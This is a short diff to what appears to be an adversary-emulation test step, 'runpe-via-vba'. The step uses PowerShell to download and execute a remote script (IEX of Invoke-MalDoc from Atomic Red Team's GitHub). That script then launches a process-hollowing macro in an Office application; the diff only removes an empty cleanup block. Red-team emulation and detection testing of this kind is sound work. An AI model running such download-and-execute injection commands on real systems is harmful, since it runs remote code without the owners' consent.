@@ -33,6 +33,3 @@ steps:
     - name: runpe-via-vba
       inline: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"{{.Args.ms_product}}\" -sub \"Exploit\"\n"
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
